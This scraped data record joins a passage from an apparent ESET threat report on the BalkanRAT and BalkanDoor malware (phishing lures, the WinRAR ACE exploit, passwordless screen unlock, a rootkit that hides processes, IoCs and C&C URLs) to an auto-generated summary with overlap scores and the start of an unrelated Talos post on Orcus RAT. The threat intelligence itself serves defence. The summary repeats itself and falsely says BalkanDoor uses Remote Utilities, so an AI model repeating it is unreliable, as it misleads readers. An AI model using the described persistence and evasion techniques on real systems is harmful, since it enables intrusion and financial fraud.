Our analysis shows that the former runs as a Windows service, which allows it to unlock the Windows logon screen remotely and without the password or start a process with the highest possible privileges. The latter misuses a legitimate remote desktop software (RDS) product and uses extra tools and scripts to hide its presence from the victim, such as hiding the window, tray icon, process and so on.Targets and distributionBoth BalkanRAT and BalkanDoor have been spread in Croatia, Serbia, Montenegro, and Bosnia and Herzegovina. (These countries, along with Slovenia and former Macedonia, formed the country of Yugoslavia until 1992.)According to our telemetry: the campaign spreading these tools has been live since 2016, with the most recent detections as late as in July 2019.The attackers have been distributing their tools via malicious emails (""malspam"") with links leading to a malicious file.The links included in the malspam emails used for distribution of both BalkanRAT and BalkanDoor mimic legitimate websites of official institutions.Table 1. Domains misused in the campaign Malicious domain Real domain Institution pksrs[.]com pks.rs Chamber of Commerce and Industry of Serbia porezna-uprava[.]com porezna-uprava.hr Ministry of Finance of Croatia, Tax Administration porezna-uprava[.]net pufbih[.]com pufbih.ba Tax Administration of the Federation of Bosnia and HerzegovinaThe decoy PDFs revolve around the tax theme.Table 2. Decoy PDFs used in the campaign PDF name Language Content MIP1023.pdf Bosnian Tax form Ponovljeni-Stav.pdf Bosnian Tax law AUG_1031.pdf Bosnian Instructions for using tax filing application Zakon.pdf Croatian Tax law ZPDG.pdf Serbian Tax lawMost often, the links leading to an executable file are disguised as links to a PDF. The executable file is a WinRAR self-extractor with its name and icon changed to resemble a PDF to fool the user. When executed, it is configured to unpack its content, open the decoy PDF to prevent any suspicion - and silently execute either BalkanRAT or BalkanDoor.In some of the latest samples of BalkanDoor detected in 2019, the malware is distributed as an ACE archive, disguised as a RAR archive (i.e., not an executable file), specially crafted to exploit the WinRAR ACE vulnerability (CVE-2018-20250). This vulnerability, which has been remediated in version 5.70 released on February 28th, 2019, is known to have been exploited quite often to distribute malware.The exploit-based deployment of BalkanDoor is stealthier than in previous versions of the malware because it does not require executing the downloaded file - an operation that might raise the intended victim's suspicions.The campaignAccording to our telemetry, most of the time, both tools have been deployed on the same machine. The combination of the tools gives the attacker both a command-line interface and a graphical interface to the compromised computer.In the case of the whole toolset being deployed on the machine, here is an example scenario for the attack:The attacker detects that the victim has the screen locked and thus, most probably, is not using the computer (either via BalkanDoor sending a screenshot showing that computer is locked, or via the View Only mode of BalkanRAT). Via the BalkanDoor backdoor, the attacker sends a backdoor command to unlock the screen... and using BalkanRAT, they can do whatever they want on the computer.However, even if the victim does not use the computer, the chance of spotting the actions performed by the attackers is still there. Even with this disadvantage, using the RDS tool may be useful. The attackers are not limited by the commands shipped in the backdoor, or by their programming skills: manually, they can perform actions that would require writing a lot of code if a backdoor were the only tool available.In principle, the Balkan- toolset could be used for espionage, among other possible goals. However, not only the campaign's targets and distribution, but also our analysis of the Balkan-toolset tools show that the attackers are going after money instead of espionage.The BalkanDoor backdoor does not implement any exfiltration channel. Presumably, if the campaign were intended for espionage, the attackers would need an exfiltration channel for uploading the collected data - at least as a backup to manual exfiltration, which might not be always an option.On the contrary - and supporting the notion that the attackers' goal has been to commit some financial crime - we've seen BalkanRAT dropping a tool that can list available smart cards, via the SCardListReadersA/ SCardConnectA API functions. Smart cards are usually issued by banks or governments for confirmation of the holder's identity. If misused, smart cards can facilitate illegal/fraudulent activities, e.g. digitally signing a contract, validating a money transaction etc.In the past, we've seen this feature in Operation Buhtrap, a campaign targeting Russian banks.Analysis - BalkanDoorBalkanDoor is a simple backdoor with a small number of commands (download and execute a file, create a remote shell, take a screenshot). It can be used to automate tasks on the compromised computer or to automatically control several affected computers at once. We have seen six versions of the backdoor, with a range of supported commands, evolve since 2016.The initial dropper unpacks all its components, opens a decoy PDF (in some cases) and executes a batch installation script that ensures persistence of the backdoor.The backdoor registers itself as a service, under a legitimately-looking service name (e.g. WindowsSvc, WindowsPrnt, WindowsConn or WindowsErr), the accompanying batch scripts can further ensure persistence by using Registry Run Keys or Startup folder.After the backdoor is installed, the computer connects to a C&C server, identifying itself by the computer name and requesting commands. The backdoor can connect to any of the C&Cs from a hardcoded list - a measure to increase resilience. It connects via the HTTP or HTTPS protocol, if HTTPS is used, then the server certificates are ignored.If the connection is not successful, the backdoor is capable of using the user-configured proxy on the victim's computer and repeating the connection attempt.The backdoor commands come in a format of an INI file, with properties determining the commands, command arguments and intended recipients. Specifying the list of recipients allows the attacker to send their commands to several compromised computers at once, e.g. to take screenshots of all compromised computers automatically.Table 3. BalkanDoor's commands Commands Functionality cn Specifies computer name(s) of the intended recipients of the commands du, int Download and execute a file du, ra, de, rpo Download and execute a file, in the specified context and on a specified desktop rip Create a remote shell accessible from the specified IP address scr_int, scr_dur Capture a series of screenshots of the specified durationFurthermore, the backdoor itself can be executed in several modes, determined by the command line arguments with which it is executed. These modes themselves can serve as backdoor commands (when executed from the remote shell):Table 4. BalkanDoor's modes Argument Functionality /unlock Unlocks the screen /rcmd Creates a remote shell and redirects its input/output to the specified IP address /takescr Captures a series of screenshots, duration determined by other arguments /run Executes the specified command using cmd.exe /runx Executes the specified command using cmd.exe, on the active (input) desktop /inst Installs itself as a service and starts the main procedure (see /nosvc) /start Starts the associated service, which starts the main procedure (see /nosvc) /nosvc Main payload, communicates with C&C and interprets backdoor commandsAmong the BalkanDoor capabilities, the most notable is passwordless screen-unlocking.This feature comes in handy to the attackers in cases when a logged-in user locks the computer. The ""Lock screen"" is just another Desktop for the system, so any malware with the necessary privileges can switch to a real desktop by command. No password is required to perform this operation.Analysis - BalkanRATThe BalkanRAT part of the malicious Balkan- toolset is more complex compared to its backdoor accomplice. Its goal is to deploy a copy of the Remote Utilities software, which is commercial software by a Russian vendor, Remote Utilities, LLC, used for remote access to a computer or for remote administration. BalkanRAT also provides the attacker with the credentials needed for this remote access.BalkanRAT has several additional components to help load, install and conceal the existence of the RDS. They can add exceptions to the firewall, hide the RDS's window and its tray icon, and hide the presence of related processes in the task manager.The dropper first unpacks all components, a configuration file, the remote desktop software and a core component installing it, a userland rootkit, a GUI hider and a decoy PDF file. The dropper opens the PDF file so as not to arouse suspicion of the user. Covertly, the dropper executes the core component (32-bit) in the installation mode. The core component (32-bit) installs itself to be executed with each start, and adds an exception to the firewall for the RDS. It executes commands inst1 and inst2 specified in the configuration file, and executes itself again, now in stealth mode. In this mode, the core component acts like a keylogger. The core component (32-bit) executes the 64-bit version of itself, in injection mode (if applicable). The core component (64-bit) injects the userland rootkit (64-bit) into task manager processes. The userland rootkit then hides the presence of the malicious processes in the task manager. The core component (32-bit) executes the RDS. It repeatedly monitors and hides the RDS window (because it is a GUI application). The core component (32-bit) injects the userland rootkit (32-bit) into task manager processes. The userland rootkit then hides the presence of the malicious processes in the task manager. The core component (32-bit) executes commands cmd1 and cmd2 , as specified in the configuration file. One such command was seen executing a GUI hider, which is an AutoHotKey script hiding the tray icon of the RDS.Note: Some components are optional. Also, sometimes they are deployed as a set comprising an encrypted payload and the corresponding loader. We are omitting these details.The configuration file of BalkanRAT is in INI file format (similarly to BalkanDoor, which uses this format for backdoor commands), with one section named [CFG]. The INI file is used by the malware' core component and the userland rootkit.Property Functionality inst1, inst2 Commands executed by the core component during installation cmd1, cmd2 Command executed by the core component main payload hproc List of processes that should be hidden by userland rootkit mproc List of processes where userland rootkit is injectedBalkanRAT's core is a multipurpose component (there are both 32-bit and 64-bit versions), it can be executed in various modes, determined by the command-line argument. Most significantly, it is used for installation of BalkanRAT, launching a userland rootkit and adding exceptions for the RDS component in the firewall.Table 5. BalkanRAT's core component - supported functionality Argument Functionality /rhc Executes a batch file /fwl Adds exception to the firewall for the specified program /sreg Sets configuration data for the RDS in the registry (especially email address where the credentials should be sent) /inst Ensures persistence by adding itself to the [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows] registry key under the ""load"" entry. Adds exception for the RDS to the local firewall. Executes itself again in the main mode (no arguments). /inj Injects the userland rootkit library into processes, as specified in the configuration file (none) Main mode. Executes the 64-bit version of itself (if applicable), injects the userland rootkit, executes the RDS and hides the window by changing its coordinates to values outside the screen.Another thread captures pressed keystrokes.The main part of the BalkanRAT malware is a copy of the Remote Utilities software for remote access. Instead of using the official version, BalkanRAT deploys a copy signed by a certificate of the attacker.The client side of the RDS running on the victim's computer must know the unique ID and the password, both generated on the server side, to connect to the server. The RDS deployed by BalkanRAT is configured in such a way that the password is the same for all victims, and the generated unique ID is sent to the attacker's email address by the tool itself.Since the tool BalkanRAT misuses is legitimate, it leverages the genuine Remote Utilities' infrastructure for this communication (rutils.com, server.rutils.com), due to this, the communication may seem legitimate to the user - and to security products.As a result, the attacker has obtained credentials to access the compromised computer via the Remote Utilities software. Using this tool, they can broadcast the screen to monitor the activity of the user and manually take over the compromised computer.To remain stealthy, BalkanRAT uses the GUI hider feature. In most samples (some older ones are exceptions), it is implemented as an AutoHotKey script, compiled into an executable file so that it can be run on a computer even if AutoHotKey is not installed there. The purpose of this script is to hide the tray icon of the RDS client.Another notable feature used by BalkanRAT to stay hidden is the ability to hide processes from the user.To achieve this, userland rootkit libraries are injected in processes hardcoded in the configuration file. The userland rootkit hooks the NtQuerySystemInformation function for the process in which it is injected. In case SystemProcessInformation is queried, it filters out all entries for processes with the names specified in the configuration file. As a result, conventional task manager utilities will not display the processes the attackers want to keep hidden from the user.Naturally, the list of processes that will be hidden contain mostly ones belonging to BalkanRAT. However, we have also seen names like ""weather.exe"" or ""preserve.exe"" in the list - which belong to the BalkanDoor backdoor. This finding supports the belief these two tools are indeed used together.ConclusionBoth BalkanRAT and BalkanDoor have some interesting tricks up their sleeves and each of them separately pose a significant risk to the victims. If used together as a toolset, they make an even more powerful weapon - the campaign we have discovered targets accounting, a function that is critical for organizations.The campaign targeting accountants in the Balkans shows some similarities (in terms of modus operandi) with a campaign aimed at Ukrainian notaries reported in 2016. (The only source we have been able to find describing it is in Russian.) In that case, the attackers' goal was to take control over a notary's computer and issue some illegal operation on behalf of the notary.Just as attackers may confirm a fraudulent transaction on behalf of a notary, they may perform a fraudulent transaction while impersonating a manager in a company's financial department.To stay safe, business users - and their employers - should follow basic cybersecurity rules: be cautious about emails and scrutinize their attachments and links, keep their software updated and use a reputable security solution.Indicators of Compromise (IoCs)ESET detection namesWin32/BalkanDoor.AWin32/BalkanDoor.BWin32/BalkanRAT.AWin32/BalkanRAT.BWin64/BalkanRAT.AWin64/BalkanRAT.BSHA-1BalkanDoor - executable files02225C58A0800A8FFFE82F7614695FDEEB75C8B33E8AF08F2C64D9D305A129FDEA6B24ED3D8D9484400FF3FD5BEF94DCBEAE24B5B8A6632DCD1D22A6576EF0057982DE87CA029C736706E840031A27F45CC4F248595268A0C9988DAEE3F0F8F9F5AC0A7F60EB2A19EC63FF36D13F472EC0E6A594C2778CE67AA3D6EA4736C3BF627DB1837B9C8D2B29D7AB8DAC5383306459CE8CD19BFF412875F093B40427C6BalkanRAT - executable and auxiliary files006B8EF615550BA731A30FA83B0E03CD16D2A92D030DC8C3832F664FA10EFA3105DFF0A9B6D48911032884A46430039ED4E38518AA20742B79AB267809D18CD045285A753BCF4F42C6F10AF76913546A0F7A95C89911E3DE9205FF6AA03E1A4FCE6BC55113D8664B438DA278CEB9C8593AE85023432054CD17EA62EBC5F86997FD7E303FBBFF3E343DA38FCC1C03ED1ADF4B4E786EFC00F3D892217FAAAFB26815EC88015FB554302DB131258C8C11C9E46209D421DE3EB6F39DF4DBBF2D1FE4B6467AAE3D9FBEBD21EE61874F299661AECC5453F4D6D0EC5380DAD0270F1FA36365273F14D89EE852D8A438A594CD0530BA2213BE4355D619E20DA733F27F59DA7B937E3170B45FB642301687A3A320282099B9D7B7F0F238E7FCD6038E688DEC9F1AF9D2D222B9BBC03A8C3927B48D315F6712D33166A3B278B7835E76A6A93C1FF7BBE8BC2BE9E5531FFAD25B18F03C51CF6B421F52733D334BE32C899670426C06CB72D92CDE46E4B456729CF659527D2697BD8518E67B5A00564F8BA64DA7EA16A7CE5AA2C83BBFCE1C8646E424500A447A187240706C059C16366FEDF1AA13EA77555844CA5CD40DFC27778C2D3B6AFA43D1B766855A3201048D8D9D696102A3C3B98DA99C2CC4FF1F64E3A46BF393936A79478C891654C1070CEC42D1685314454A7D7987B38ADD2EDDBAC3DB9E78464F6C83ABE56219CA656B71AA8C109E0955061DA5366E27F7C61230452555B52B39AB9F51D42C725BED6EF16FAA19FC4CEF66C4C1B66E58FB9CFFD8098E72DB8CCC962E2D2C15AC30E98F7382E3ACDEDDA8730E20EE7228080A7F90A238D9E65D55EDD8430173E0A62F1AAAB3457D895B4B1E6E2119B8B8D1677BA4D127C6CD6B5392870F0272C7045C9932DB177BF564891089377809D3F0C2C9E25FD087F5F42B8852647B1C1A2EFA4F25FEA393D773F9FF94D6FA8D9A804B1433A05216CFE1D4E61CE5EB092A35058F85738534158DB9C600A29B9DED8AC85C3DE8C1963CF321740C4EF606FEC65FCE85FB3A9A6223AC97926E2A7514D4078CF51EAC069A014309E607F19EA0C6A17EE4EB23371688972B7F4E6D4D53F3C89F2C6A44453E882098B17B66DE70C430C64C3B26A1DEA762DD4329E77FE59526D4ABC0E15DE2BBBCA56A299A8EEF9F4FF082184F66FAD1B76C7CACB8A5ACE8F90C33CBDB12D398C0F227EC48F99551BFAA4AD783DFE3CC6B0B9612814ED9418253203C50AB311B53591C6625335B9B791676A44538B48821AEDF43347AF24D266EC5D471723F4B30B4ACC0D0B18222E93D25649BC1B67FAB4F9BF2B4C59D9A1AB8F67BB5682B26ACD5969D9C6AC7B45FE07E79E1BAD38D474D5CAAAC27082E6F727CAE269F64CF3CBEEF0EE9397B01855C6DAA2BFF8002DB4899B121BFE3F5CEC25181F1B6852E145013E548B920651EC268CAB6D8EC267EEE463672809FAAEE99C2F446C2F9FFDF518DA9E037F76902746DE89C2E2821E8C3813734D3BFC07E339C05417055A1A106E2FBBDC8CBBC175451A097E605E448F94C89D3E050ACD5C90756A3C6F6DC34E12BABF5F26543510AACE704C90B5471BBA3293C0A0E6829A81FBE2EB10B42B2CD1BC431F53E9CFF8204279CDF274838DE8EBB61CD82D898A3CEA623179456D9AE5FAD1FB5DA01A0CDBB74CA0960F2E8631D49ACABF2CEA878AE35B8CE7092FF909E9380CC647C3350AA3067E40C36A9CEA70DB7FB8E851EF0D6A257A41C9CEE904345B5CF7A8AFAC141E162A0204A49BAD0A49C259B5A45DEEA26F5AF918CEC406B4F12184F0CAB2755B602DFDFCC61770425A8D1520550C028D1DF2861E53FE0007A2E0E9AE47DD028029C402D7D0A08EBBC25E00C309E3FE09248B8AFCFF29FC1A79445C913DAE95C651C539EAF73E142D1867A1A96098A5E219FECEEE01F4E8051F544062AE37D76A3DF2921DF82F06CB000F9A25DDE791C7E5BC30917C74A8F2876F26C663D5F6F534543A7C42B02254C98BB4EC0D5F3BC2F436693B61FED7FA7DDF8BC7F27618F24F3F6030AE46DC2CEF9C68DA1844F7DCEA4F25A90A3FA19E71F9A836EA832B5D738D833C721D776781AFFE23D510A24DB27C1C171D2BAF1FBEB18899039Remote Utilities (otherwise legitimate releases signed by attackers' certificates)038ECEB80597DE438D8194F8F57245EB0239FF4B2A1BB4BB455D3238A01E121165603A9B58B4D09D34CE3FBEE3C487F4F467B9E8EB36844BB5ACB4653B88D4047FA2B8F8FA6241320D81508EB676EA7A400438EB302886FD064274188647E6653E455EED42F70DAA8C75E97551935D2370142C8904F5A20D446D3FBAE9889FE59AFAD02C6FB71D8838C3FC674D46FB773C02A9FF98E998DA4F0777FB5D9F796B510C93D3DC620B17500C10369585F4AF7CF3CE0D6A5CA3B9EE0A048F0AEE1E99CBF3943D84F597FF6D53E7B5099CE11ACA176519620E8064D4FF9AD07CEC39AC6A436577E02E7E8FE8226A00E58564CB8888014C16732CD5136A8315127BA50BB8BB94EDA5A05BA6E24226F1BC575CBC12B9FC59F6039312B77CFFF0E359946029120DD642505BC0A9713ECCBC6F31D5EBC71FF83BACC0B4471FDEFC206B28D0BE8A582360FB16A4B515CD633227D6A002D142FAC6E62A113E95705F9B612CDBF49DAC6BAD2073BDD8D27C742DA87292EF19A197594193C2C5E5F845DBE0E084B2A8CE4711C3DF4E62E8062234BF6D3BE56189FE86C9537C28099518D4F4EA2E42EF9EEEE918192D2B5C565A9B2756A1D01070C6608F361CScripts0BD6C70B7E2320F42F0CFC2A79E161614C7C4F667A41B912A3F99370DF4CD3791C91467E23B2AA82A15AB505B79B88A9E868C95CE544942403C58CB6A8A5980DE35FBF580497B43EF7E8499E004F9F38B248E43BAB127D8E1E466821B96B7B7ECF37CB78Configuration files28F152154F6E6074EA0DE34214102119C858958337A2A15C52CAA7D63AF86778C2DD1D2D81D4A270B4A847D7AAC4164CF90EA585E4842CBF938B26CFDecoy PDF files1E0C4A5F0FF2E835D12C3B6571AE6000E81A014B8722441FF3678D154C89E312DB1A54951DD21C3F88C3FDA42768C5B465FD680591639F2CDC9332839F48E109675CDB0A53400358C27853DB48FCD156C9B592BD7B69995C75CD5B1E4261B229C27FB479Misused certificatesName Email Valid from Valid to SHA1 Thumbprint Status at the time of writing AMO-K Limited Liability Company llc.amo-k@list.ru 2015/07/30 2016/07/28 4E36C4D10F1E3D820058E4D451C4A7B77856BDB3 Expired Valmpak, TOV tov-valpak@mail.ru 2016/04/10 2017/04/01 17D50E2DBBAF5F8F60BFFE1B90F4DD52FDB44A09 Revoked Valmpak, TOV - 2016/08/22 2017/11/04 4A362020F1AFD3BD0C67F12F55A5754D2E70338C Revoked 3D PEOPLE LIMITED - 2017/11/05 2018/11/06 936EDFB338D458FBACB25FE557F26AA3E101506E Expired ADUNIK LTD - 2017/10/11 2018/10/12 E7DF448539D1E2671DCF787CF368AAC2ED8F5698 Expired SLOW BEER LTD administrator@slowbeerltd.info 2019/01/25 2019/12/18 2359D644E48759F43993D34885167FECAFD40022 RevokedFile namesBalkanDoorDropper: Zakon.exeBackdoors: weather.exe, winmihc.exe, Preserve.exe, PreservS.exe, WindowsConnect.exeScripts: weather.cmd, winmihc4.cmd, mihcupdate.cmdDecoy PDF file: Zakon.pdfBalkanRATDroppers: ZPDGI.exe, ZPDGV.exe, ZPDGE.exe, ZPDGO.exe, ZPDGU.exe, ZPDGA.exe, Ponovljeni-Stav.exe, AUG_1031.exe, MIP1023.exeConfiguration file: stg.cfgDecoy PDF files: ZPDG.pdf, Ponovljeni-Stav.pdf, AUG_1031.pdf, MIP1023.pdfCore component: winchk32.exe, wininit.exe, hide.exe, winchk64.exeRDS: rutserv.exe, rfusclient.exeUserland rootkit: winmmon.dll, winmmon64.dllGUI hider components: serk.bat, serk.exeFolder names%WINDIR%\1B20F6AA-6CAD-45A7-81CB-120FB86FECD8%WINDIR%\29D451CF-3548-4486-8465-A23029B8F6FA%WINDIR%\B1EDD68E-6AD8-4A7E-91A1-3C30903B8DD4%APPDATA%\1B20F6AA-6CAD-45A7-81CB-120FB86FECD8%APPDATA%\29D451CF-3548-4486-8465-A23029B8F6FA%APPDATA%\B1EDD68E-6AD8-4A7E-91A1-3C30903B8DD4C&C servershttp://bestfriendsroot[.]com/smart.phphttp://bestfriendsroot[.]com/weather.phphttp://bestfriendsroot[.]com/zagreb.phphttp://consaltingsolutionshere[.]com/smart.phphttp://consaltingsolutionshere[.]com/weather.phphttp://consaltingsolutionshere[.]com/zagreb.phphttp://dogvipcare[.]net/kversion.phphttp://hvar.dogvipcare[.]net/dekol.phphttp://kimdotcomfriends[.]com/smart.phphttp://kimdotcomfriends[.]com/weather.phphttp://kimdotcomfriends[.]com/zagreb.phphttp://limosinevipsalon[.]com/kversion.phphttp://luxembourgprotections[.]com/kversion.phphttp://malmevipbikes[.]se/kversion.phphttp://split.malmevipbikes[.]se/dekol.phphttp://zagreb.porezna-uprava[.]com/dekol.phpEmail addresses used to exfiltrate Remote Utilities credentialsb.klokov@inbox.rugalkin.valentin.83@bk.rugligorijmaskov@mail.ruivan.aslanov@newmail.ruivan.tatarov@qip.rumelikov.viktor@yandex.rumr.aleksandrandreev@mail.rutest@bbportal.infotgerik@list.ruvladzlobin@list.ruMITRE ATT&CK techniquesBalkanRATTactic ID Name Description Initial Access T1192 Spearphishing Link BalkanRAT is distributed via emails that contain links to malware. Execution T1059 Command-Line Interface BalkanRAT uses cmd.exe to execute files. T1106 Execution through API BalkanRAT uses ShellExecuteExW and LoadLibrary APIs to execute other malware components. T1064 Scripting BalkanRAT uses batch scripts for malware installation and execution. T1204 User Execution BalkanRAT relies on the victim to execute the initial infiltration. The malware is disguised as PDF documents with misleading names, in order to entice the intended victim to click on it. Persistence T1060 Registry Run Keys / Startup Folder BalkanRAT uses the following Registry Run key to establish persistence: [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows], ""load"". Privilege Escalation T1134 Access Token Manipulation BalkanRAT is able to impersonate the logged-on user using DuplicateTokenEx or ImpersonateLoggedOnUser APIs. Defense Evasion T1116 Code Signing BalkanRAT is digitally signed with code-signing certificates. T1140 Deobfuscate/Decode Files or Information BalkanRAT decrypts and decompresses some of its components. T1089 Disabling Security Tools BalkanRAT is capable of adding exceptions to the local firewall, using its COM interface. T1112 Modify Registry BalkanRAT modifies the [HKEY_CURRENT_USER\Software\Usoris\Remote Utilities\Server\Parameters] registry key to store configuration of the RDS T1027 Obfuscated Files or Information Some components of BalkanRAT are compressed and then encrypted by a XOR cipher. T1055 Process Injection BalkanRAT injects a userland rootkit library into processes of task manager utilities. T1108 Redundant Access Operators of BalkanRAT have been seen deploying a second malicious tool (BalkanDoor) to preserve remote access in case BalkanRAT is removed. T1014 Rootkit BalkanRAT uses a userland rootkit that hooks the NtQuerySystemInformation function to hide the presence of malicious processes. T1143 Hidden Window BalkanRAT uses 3rd party remote desktop software and hides its window and tray icon in order to hide it from the user. Discovery T1082 System Information Discovery BalkanRAT collects the computer name and the language settings from the compromised machine. Collection T1056 Input Capture BalkanRAT is capable of logging pressed keystrokes. Command and Control T1219 Remote Access Tools BalkanRAT has misused legitimate remote desktop software for remote access.BalkanDoorTactic ID Name Description Initial Access T1192 Spearphishing Link BalkanDoor is distributed via emails that contain links to download malware. Execution T1059 Command-Line Interface BalkanRAT uses cmd.exe to create a remote shell. T1106 Execution through API BalkanRAT uses ShellExecuteExW and LoadLibrary APIs to execute files. T1203 Exploitation for Client Execution BalkanDoor can be distributed as an ACE archive disguised as a RAR archive, exploiting CVE-2018-20250 vulnerability in WinRAR to execute malicious code. T1064 Scripting BalkanDoor uses batch scripts for malware installation and execution. T1035 Service Execution BalkanDoor's backdoor can be executed as a service. T1204 User Execution BalkanDoor relies on the victim to execute the initial infiltration. The malware is disguised as PDF documents or RAR archives with misleading names, in order to entice the intended victim to click on it. Persistence T1050 New Service BalkanDoor can be installed as a new service, mimicking legitimate Windows services. T1060 Registry Run Keys / Startup Folder BalkanDoor can be installed in the Registry Run key, or dropped in the Startup folder. Privilege Escalation T1134 Access Token Manipulation BalkanDoor is able to create a process under the security context of a different user, using DuplicateTokenEx , SetTokenInformation or CreateProcessAsUserW APIs. Defense Evasion T1116 Code Signing BalkanDoor is digitally signed with code-signing certificates. T1107 File Deletion BalkanDoor deletes files with backdoor commands after the commands have been executed. T1158 Hidden Files and Directories BalkanDoor sets attributes of its files to HIDDEN, SYSTEM and READONLY. T1036 Masquerading BalkanDoor can be installed as a service with names mimicking legitimate Windows services. T1108 Redundant Access Operators of BalkanDoor have been seen deploying a second malicious tool (BalkanRAT) to preserve remote access in case BalkanDoor is removed. Discovery T1082 System Information Discovery BalkanDoor collects the computer name from the compromised machine. Collection T1113 Screen Capture BalkanDoor can capture screenshots of the compromised machine. Command and Control T1043 Commonly Used Port BalkanDoor uses ports 80 and 443 for C&C communication. T1090 Connection Proxy BalkanDoor is capable of identifying a configured proxy server if one exists and then using it to make HTTP requests. T1008 Fallback Channels BalkanDoor can communicate over multiple C&C hosts. T1071 Standard Application Layer Protocol BalkanDoor uses HTTP or HTTPS for network communication.Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";BalkanDoor and BalkanRAT are two malware tools used by cybercriminals. BalkanRAT is a Remote Access Trojan (RAT) that uses the legitimate Remote Utilities software for remote access. BalkanDoor is a backdoor that uses the legitimate Remote Utilities software for remote access. BalkanRAT and BalkanDoor both use the Remote Utilities infrastructure to remain stealthy. BalkanRAT uses the GUI hider feature and injects userland rootkit libraries into processes hardcoded in the configuration file. The userland rootkit hooks the NtQuerySystemInformation function for the process in which it is injected. In case SystemProcessInformation is queried, it filters out all entries for processes with the names specified in the configuration file. As a result, conventional task manager utilities will not display the processes the attackers want to keep hidden from the user. BalkanRAT and BalkanDoor both use the Remote Utilities infrastructure to remain stealthy. BalkanRAT uses the GUI hider feature and injects userland rootkit libraries into processes hardcoded in the configuration file. The userland rootkit hooks the NtQuerySystemInformation function for the process in which it is injected. In case SystemProcessInformation is queried, it filters out all entries for processes with the names specified in the configuration file. As a result, conventional task manager utilities will not display the processes the attackers want to keep hidden from the user.;en;{'r': 0.05498533724340176, 'p': 0.9493670886075949, 'f': 0.10395010291510767};{'r': 0.028706518068220197, 'p': 0.7657657657657657, 'f': 0.05533854097012203};{'r': 0.054252199413489736, 'p': 0.9367088607594937, 'f': 0.10256410152910629}
https://blog.talosintelligence.com/rat-ratatouille-revrat-orcus/;RAT Ratatouille: Backdooring PCs with leaked RATs;"Executive summaryOrcus RAT and RevengeRAT are two of the most popular remote access trojans (RATs) in use across the threat landscape. Since its emergence in 2016, various adversaries used RevengeRAT to attack organizations and individuals around the world. The source code associated with RevengeRAT was previously released to the public, allowing attackers to leverage it for their own malicious purposes. There are typically numerous, unrelated attackers attempting to leverage this RAT to compromise corporate networks for the purposes of establishing an initial point of network access, the performance of lateral movement, as well as to exfiltrate sensitive information that can be monetized. Orcus RAT was in the news earlier this year due to Canadian law enforcement activity related to the individual believed to have authored the malware.Cisco Talos recently discovered a threat actor that has been leveraging RevengeRAT and Orcus RAT in various malware distribution campaigns targeting organizations including government entities, financial services organizations, information technology service providers and consultancies. We discovered several unique tactics, techniques, and procedures (TTPs) associated with these campaigns including the use of persistence techniques most commonly associated with ""fileless"" malware, obfuscation techniques designed to mask C2 infrastructure, as well as evasion designed to circumvent analysis by automated analysis platforms such as malware sandboxes.The characteristics associated with these campaigns evolved over time, showing the attacker is constantly changing their tactics in an attempt to maximize their ability to infect corporate systems and work toward the achievement of their longer-term objectives.Malicious email campaignsThere have been several variations of the infection process associated with these malware distribution campaigns over time. In general, the emails in every case claim to be associated with complaints against the organization being targeted. They purport to be from various authorities such as the Better Business Bureau (BBB). Below is an example of one of these emails:Phishing emailIn addition to Better Business Bureau, Talos has also observed emails purporting to be associated with other entities such as Australian Competition & Consumer Commission (ACCC), Ministry of Business Innovation & Employment (MBIE) and other regional agencies.Earlier malware campaigns contained a hyperlink that directed potential victims to the malicious content responsible for initiating the malware infection. The attacker made use of the SendGrid email delivery service to redirect victims to an attacker-controlled malware distribution server.The link in one example email was pointed to the following SendGrid URL:https://u12047697[.]ct[.]sendgrid[.]net/wf/click?upn=X2vR6-2FdIf8y2XI902U8Tc8qh9KOPBogeTLss4h7AKXe0xRjCQw1VcMTssPPPTU28KY7PwUPERvVvIa8n4VQD-2Fw-3D-3D_tIiqtngjMfK6xwiZyGxyMuaZ5weLruJKBoFJsVrKYBziY2h51ElcQ2ocLru0oJCxt-2FOlkcr6RH8ktqTc-2B-2BQjmMscOQaeiy2zw8OOUb6nD0f1srQnQG-2B-2BIXtpubqjWMnnIHxJg3TvgFRq0itu75WQHjsdUv1O1g-2FrQzQAyJkGQN6vC9fH5R4R4FyLG9ahUnvbnHt-2FEmdUJQuft0jfw2c5uPBA2M5Yspgi-2Fodr8cEU2b8-3DThis URL is responsible for redirecting the client to a URL hosted on an attacker-controlled server that hosts a ZIP archive containing the malicious PE32 used to infect the system. Below, you can see the HTTP GET request that is responsible for retrieving this and continuing the infection process.ZIP File downloadA PE32 executable is inside of the ZIP archive. It needs to be executed by the victim to infect the system with Orcus RAT. The PE32 filename features the use of double extensions (478768766.pdf.exe) which, by default on the Windows operating system, will only display the first extension (.PDF.) The PE32 icon has been set to make the file appear as if it is associated with Adobe AcrobatDouble extensions trickThis loader (478768766.pdf.exe) is protected by the SmartAssembly .NET protector (see below), but can easily be deobfuscated via d4dot. It is responsible for extracting and decrypting the Orcus RAT. It extracts the Orcus executable from its Resource ""???????"" as shown in the screenshots below.Orcus loader resourcesThe Class5.smethod_1 method, shown in the screenshot below, decodes the content from the resource section and restores the original Orcus RAT PE file.Resource section payload decodingThe smethod_3 shown below finally starts another instance of the loader (478768766.pdf.exe) and injects the Orcus PE file into this loader process. Then it resumes the process, which executes the Orcus RAT PE file in memory in the 478768766.pdf.exe process context. This means the original Orcus RAT PE file is never written to disk in clear text. This makes it more difficult for anti virus systems to detect it.Process injection methodThe loader achieves persistence by creating a shortcut that points to its executable and storing the shortcut in the following Startup directory:C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartupThe dropper also copies itself over to %APPDATA%\Roaming\trfgtf\rfgrf.exe and creates and starts the rfgrf.exe.bat file, which you can see below. The bat file executes the copy of the loader every 60 seconds.rfgrf.exe.batIn later campaigns, the adversary modified the infection process and emails no longer leveraged the SendGrid URLs. Later emails featured the same themes and verbiage but were modified to contain ZIP archive attachments.Phishing emailThe attached ZIP archives contain malicious batch files responsible for retrieving the malicious PE32 file and executing it, thus infecting the system. Early versions of the batch file retrieved additional malicious content from the same server previously used to host the ZIP archives.Malicious .bat downloaderOne interesting thing to note about the batch files was the use of an obfuscation technique that is not commonly seen. In early campaigns, the attacker prepended the bytes ""FF FE 26 63 6C 73 0D 0A"" into the file, causing various file parsers to interpret the file contents as UTF-16 LE, resulting in the parsers failing to properly display the contents of the batch file.Unicode obfuscation standard editorThe hex view of the same file shows these prepended bytes which are responsible for this parsing issue.Unicode 